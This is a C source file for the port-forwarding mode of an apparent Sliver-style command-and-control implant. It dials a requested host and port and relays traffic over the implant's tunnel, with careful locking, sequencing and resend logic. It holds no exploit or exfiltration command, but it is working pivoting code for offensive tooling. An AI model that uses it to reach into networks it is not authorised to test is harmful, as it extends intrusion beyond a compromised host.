/* src/modes/portfwd.c - in-band TCP port forwarding over a tunnel.
 *
 * Client sends PortfwdReq{Host,Port,TunnelID}; we dial the target and relay
 * bytes both ways: socket -> TunnelData{Sequence} frames, and inbound
 * TunnelData -> socket.
 *
 * Ownership rules (see the audit note in docs/refactor/16-audit-2026-11.md):
 *   - one module lock (g_portfwd_lock) guards the slot table and every mutable
 *     field of an entry, including f->sock;
 *   - the relay thread is the only party that closes/frees the socket it was
 *     started with; everybody else only calls sliver_socket_shutdown() and
 *     waits for the relay to release the slot.
 */
#include "sliver/rpc.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "sliver/log.h"
#include "sliver/platform.h"
#include "sliver/proto.h"

#define SLIVER_MAX_PORTFWDS 8
#define SLIVER_PORTFWD_CHUNK 8192
#define SLIVER_PORTFWD_POLL_MS 200
#define SLIVER_PORTFWD_SEND_TIMEOUT_MS 5000

typedef struct {
  uint64_t id;
  int used;
  sliver_socket_t *sock;
  uint64_t sequence;
  uint64_t read_sequence;
  uint8_t pending[8192];
  size_t pending_len;
  volatile int stop;
  int thread_running;
  int closing;
} portfwd_t;

typedef int (*sliver_portfwd_send_fn)(uint32_t type, const void *data, size_t len);

static portfwd_t g_forwards[SLIVER_MAX_PORTFWDS];
static sliver_portfwd_send_fn g_send = NULL;
static sliver_mutex_t *g_portfwd_lock = NULL;

/* Created once by sliver_plat_init()-time usage: the lazy create is not itself
 * thread safe, so every path funnels through here while the module is still
 * single threaded (session start) or already holding the lock. */
static void portfwd_lock(void) {
  if (g_portfwd_lock == NULL) {
    g_portfwd_lock = sliver_mutex_create();
  }
  if (g_portfwd_lock != NULL) {
    sliver_mutex_lock(g_portfwd_lock);
  }
}

static void portfwd_unlock(void) {
  if (g_portfwd_lock != NULL) {
    sliver_mutex_unlock(g_portfwd_lock);
  }
}

void sliver_portfwd_set_sender(sliver_portfwd_send_fn fn) { g_send = fn; }

/* Requires g_portfwd_lock. */
static portfwd_t *forward_find(uint64_t id) {
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    if (g_forwards[i].used && !g_forwards[i].closing && g_forwards[i].id == id) {
      return &g_forwards[i];
    }
  }
  return NULL;
}

/* Requires g_portfwd_lock. Stops a forward. A running relay keeps ownership of
 * the socket: it is only woken up (shutdown) and releases the slot itself when
 * it leaves forward_thread(). Closing/freeing here was a use-after-free. */
static void forward_release_locked(portfwd_t *f) {
  if (f == NULL || !f->used) {
    return;
  }
  f->stop = 1;
  if (f->thread_running) {
    f->closing = 1;
    if (f->sock != NULL) {
      sliver_socket_shutdown(f->sock);
    }
    return;
  }
  if (f->sock != NULL) {
    sliver_socket_close(f->sock);
    f->sock = NULL;
  }
  memset(f, 0, sizeof(*f));
}

void sliver_portfwd_shutdown(void) {
  portfwd_lock();
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    forward_release_locked(&g_forwards[i]);
  }
  portfwd_unlock();
}

/* Gap recovery: ask the peer to resend from read_sequence (mirrors shell.c).
 * Requires g_portfwd_lock (the sequence fields live under it). */
static int forward_resend_locked(portfwd_t *f) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  if (sliver_tunnel_resend_encode(&msg, f->sequence, f->id, f->read_sequence) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

/* socket -> tunnel. The relay thread is the only caller, but the sequence
 * counter is read by forward_resend_locked() from the session thread, so the
 * module lock is taken here as well. */
static int forward_send_data(portfwd_t *f, const void *data, size_t len) {
  sliver_buf_t msg;
  int rc;

  if (g_send == NULL) {
    return -1;
  }
  sliver_buf_init(&msg);
  portfwd_lock();
  rc = sliver_tunnel_data_encode(&msg, data, len, 0, f->sequence, f->id, f->read_sequence);
  if (rc == 0) {
    rc = g_send(SLIVER_MSG_TUNNEL_DATA, msg.data, msg.len);
    if (rc == 0) {
      f->sequence++;
    }
  }
  portfwd_unlock();
  sliver_buf_free(&msg);
  return rc;
}

/* Terminal: MsgTunnelClose{Closed, Sequence = exclusive prefix}. */
static int forward_close(portfwd_t *f) {
  sliver_buf_t msg;
  uint64_t seq;
  int rc;
  if (g_send == NULL) {
    return -1;
  }
  portfwd_lock();
  seq = f->sequence;
  portfwd_unlock();
  sliver_buf_init(&msg);
  if (sliver_tunnel_close_encode(&msg, seq, f->id) != 0) {
    sliver_buf_free(&msg);
    return -1;
  }
  rc = g_send(SLIVER_MSG_TUNNEL_CLOSE, msg.data, msg.len);
  sliver_buf_free(&msg);
  return rc;
}

static void forward_thread(void *arg) {
  portfwd_t *f = (portfwd_t *)arg;
  sliver_socket_t *sock;
  char buf[SLIVER_PORTFWD_CHUNK];

  /* Snapshot the socket we own: nobody else may close it. */
  portfwd_lock();
  sock = f->sock;
  portfwd_unlock();

  while (!f->stop && sock != NULL) {
    long n = sliver_socket_recv(sock, buf, sizeof(buf));
    if (n == 0) {
      break;
    }
    if (n < 0) {
      if (n == -2 && !f->stop) {
        continue; /* receive timeout: poll the stop flag */
      }
      break;
    }
    LOG_DEBUG("portfwd: socket->tunnel %ld bytes", n);
    if (forward_send_data(f, buf, (size_t)n) != 0) {
      LOG_WARN("portfwd: tunnel send failed, closing");
      break;
    }
  }
  if (!f->stop && sock != NULL) {
    LOG_INFO("portfwd: closing tunnel=%llu (socket EOF)", (unsigned long long)f->id);
    (void)forward_close(f);
  }
  /* The relay thread owns the socket and the entry until it exits. */
  portfwd_lock();
  if (sock != NULL) {
    sliver_socket_close(sock);
  }
  f->sock = NULL;
  memset(f, 0, sizeof(*f));
  portfwd_unlock();
}

/* The client creates the tunnel server-side and binds it by sending a zero byte
 * TunnelData before the PortfwdReq arrives. Modern servers only wait for their
 * own client-side stream (server/rpc/rpc-portfwd.go Portfwd -> ClientBound), so
 * no reply is sent here; the placeholder lets early data be buffered. */
int sliver_portfwd_bind(uint64_t id) {
  portfwd_t *f;
  int rc = 0;

  portfwd_lock();
  if (forward_find(id) != NULL) {
    portfwd_unlock();
    return 1;
  }
  for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
    if (!g_forwards[i].used) {
      f = &g_forwards[i];
      memset(f, 0, sizeof(*f));
      f->used = 1;
      f->id = id;
      rc = 1;
      break;
    }
  }
  portfwd_unlock();
  return rc;
}

int sliver_rpc_handle_portfwd(const sliver_envelope_t *req, sliver_buf_t *out) {
  sliver_reader_t r;
  uint32_t field, wire;
  char host[512];
  uint32_t port = 0;
  uint64_t tunnel_id = 0;
  sliver_socket_t *sock;
  portfwd_t *f = NULL;
  uint64_t id;
  int rc;

  /* Port forwarding relays a socket over a long-lived tunnel; a beacon cannot
   * deliver those frames, so answer with an error instead of opening a socket. */
  if (!sliver_rpc_has_capability(SLIVER_CAP_TUNNEL)) {
    sliver_buf_t resp;
    int ok;
    sliver_buf_init(&resp);
    if (sliver_buf_put_string(&resp, 1, "port forwarding is not available in beacon mode") !=
        0) {
      sliver_buf_free(&resp);
      return -1;
    }
    ok = sliver_buf_put_bytes(out, 9, resp.data, resp.len);
    sliver_buf_free(&resp);
    return ok;
  }

  host[0] = '\0';
  sliver_reader_init(&r, req->data, req->data_len);
  while ((rc = sliver_reader_next(&r, &field, &wire)) == 0) {
    if (field == 3 && wire == 2) {
      if (sliver_reader_string(&r, host, sizeof(host)) != 0) {
        return -1;
      }
    } else if (field == 1 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      port = (uint32_t)v;
    } else if (field == 8 && wire == 0) {
      uint64_t v;
      if (sliver_reader_varint(&r, &v) != 0) {
        return -1;
      }
      tunnel_id = v;
    } else if (sliver_reader_skip(&r, wire) != 0) {
      return -1;
    }
  }
  if (host[0] == '\0' || port == 0) {
    return -1;
  }
  sock = sliver_tcp_connect(host, (uint16_t)port);
  if (sock == NULL) {
    char errmsg[256];
    LOG_WARN("portfwd: cannot connect %s:%u", host, (unsigned)port);
    /* Answer with a proper error, otherwise the client shows a healthy forward
     * and every connection just hangs. */
    (void)snprintf(errmsg, sizeof(errmsg), "portfwd: cannot connect %s:%u", host, (unsigned)port);
    if (sliver_buf_put_string(out, 3, host) != 0 || sliver_buf_put_uint32(out, 1, port) != 0 ||
        sliver_buf_put_uint64(out, 8, tunnel_id) != 0) {
      return -1;
    }
    {
      sliver_buf_t resp;
      int ok;
      sliver_buf_init(&resp);
      if (sliver_buf_put_string(&resp, 1, errmsg) != 0) {
        sliver_buf_free(&resp);
        return -1;
      }
      ok = sliver_buf_put_bytes(out, 9, resp.data, resp.len);
      sliver_buf_free(&resp);
      return ok;
    }
  }
  sliver_socket_set_recv_timeout(sock, SLIVER_PORTFWD_POLL_MS);
  sliver_socket_set_send_timeout(sock, SLIVER_PORTFWD_SEND_TIMEOUT_MS);
  id = tunnel_id;

  portfwd_lock();
  f = forward_find(id);
  if (f != NULL && f->sock != NULL) {
    /* Same tunnel id requested twice: keep the first socket, drop the new one. */
    portfwd_unlock();
    sliver_socket_close(sock);
    LOG_WARN("portfwd: tunnel=%llu already attached", (unsigned long long)id);
    return -1;
  }
  if (f == NULL) {
    for (size_t i = 0; i < SLIVER_MAX_PORTFWDS; ++i) {
      if (!g_forwards[i].used) {
        f = &g_forwards[i];
        break;
      }
    }
    if (f != NULL) {
      memset(f, 0, sizeof(*f));
      f->used = 1;
      f->id = id;
    }
  }
  if (f == NULL) {
    portfwd_unlock();
    sliver_socket_close(sock);
    return -1;
  }
  /* Bound earlier by the client bind frame: attach the socket. */
  f->sock = sock;
  if (f->pending_len != 0) {
    LOG_DEBUG("portfwd: flushing %u buffered bytes", (unsigned)f->pending_len);
    (void)sliver_socket_send(f->sock, f->pending, f->pending_len);
    f->pending_len = 0;
  }
  f->stop = 0;
  f->closing = 0;
  f->thread_running = 1;
  {
    sliver_thread_t *th = sliver_thread_create(forward_thread, f);
    if (th == NULL) {
      f->thread_running = 0;
      f->sock = NULL;
      portfwd_unlock();
      sliver_socket_close(sock);
      return -1;
    }
    sliver_thread_detach(th);
  }
  portfwd_unlock();
  LOG_INFO("portfwd: connected %s:%u tunnel=%llu", host, (unsigned)port,
           (unsigned long long)id);

  /* Portfwd{Host=3, Port=1, TunnelID=8, Response=9}. */
  if (sliver_buf_put_string(out, 3, host) != 0 || sliver_buf_put_uint32(out, 1, port) != 0 ||
      sliver_buf_put_uint64(out, 8, id) != 0) {
    return -1;
  }
  return sliver_buf_put_tag(out, 9, 2) == 0 && sliver_buf_put_varint(out, 0) == 0 ? 0 : -1;
}

/* Returns 1 when the tunnel id belonged to a port forward. */
int sliver_portfwd_tunnel_data(const sliver_tunnel_data_t *td) {
  portfwd_t *f;

  portfwd_lock();
  f = forward_find(td->tunnel_id);
  if (f == NULL) {
    portfwd_unlock();
    return 0;
  }
  if (td->ack != 0 && td->data_len == 0 && !td->closed) {
    portfwd_unlock();
    return 1;
  }
  if (f->sock == NULL) {
    /* Data can arrive before PortfwdReq is processed: buffer it instead of
     * dropping the connection. */
    size_t room = sizeof(f->pending) - f->pending_len;
    size_t take = td->data_len < room ? td->data_len : room;
    if (take != 0) {
      memcpy(f->pending + f->pending_len, td->data, take);
      f->pending_len += take;
      LOG_DEBUG("portfwd: buffered %u bytes until the socket is ready", (unsigned)take);
    }
    portfwd_unlock();
    return 1;
  }
  if (td->sequence == f->read_sequence) {
    if (td->data_len != 0) {
      LOG_DEBUG("portfwd: tunnel->socket %u bytes", (unsigned)td->data_len);
      (void)sliver_socket_send(f->sock, td->data, td->data_len);
    }
    if (td->closed) {
      forward_release_locked(f);
      portfwd_unlock();
      return 1;
    }
    f->read_sequence++;
  } else if (td->sequence > f->read_sequence) {
    /* Out-of-order frame: request the missing bytes instead of silently dropping
     * them (the shell path already does this; portfwd used to lose the frame). */
    LOG_DEBUG("portfwd: gap id=%llu want=%llu got=%llu", (unsigned long long)f->id,
              (unsigned long long)f->read_sequence, (unsigned long long)td->sequence);
    (void)forward_resend_locked(f);
  }
  portfwd_unlock();
  return 1;
}

int sliver_portfwd_tunnel_close(uint64_t tunnel_id) {
  portfwd_t *f;
  portfwd_lock();
  f = forward_find(tunnel_id);
  if (f == NULL) {
    portfwd_unlock();
    return 0;
  }
  forward_release_locked(f);
  portfwd_unlock();
  return 1;
}
